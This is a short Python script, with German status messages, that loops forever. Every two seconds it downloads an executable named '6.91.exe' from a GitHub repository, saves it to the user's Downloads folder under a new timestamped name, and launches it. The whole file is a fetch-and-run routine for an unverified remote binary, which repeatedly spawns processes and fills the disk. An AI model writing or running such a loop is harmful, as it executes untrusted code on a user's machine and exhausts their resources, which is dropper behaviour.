import urllib.request
import time
from pathlib import Path
from datetime import datetime
import subprocess

url = "https://github.com/LurNyx/Nxo-Launcher-Tool/raw/main/6.91.exe"
download_ordner = Path.home() / "Downloads"

while True:
    try:
        zeit = datetime.now().strftime("%Y%m%d_%H%M%S")
        datei = download_ordner / f"6.91_{zeit}.exe"

        print(f"Lade herunter: {datei.name}")
        urllib.request.urlretrieve(url, datei)

        print("Starte Datei...")
        subprocess.Popen([str(datei)])

    except Exception as e:
        print(f"Fehler: {e}")

    time.sleep(2)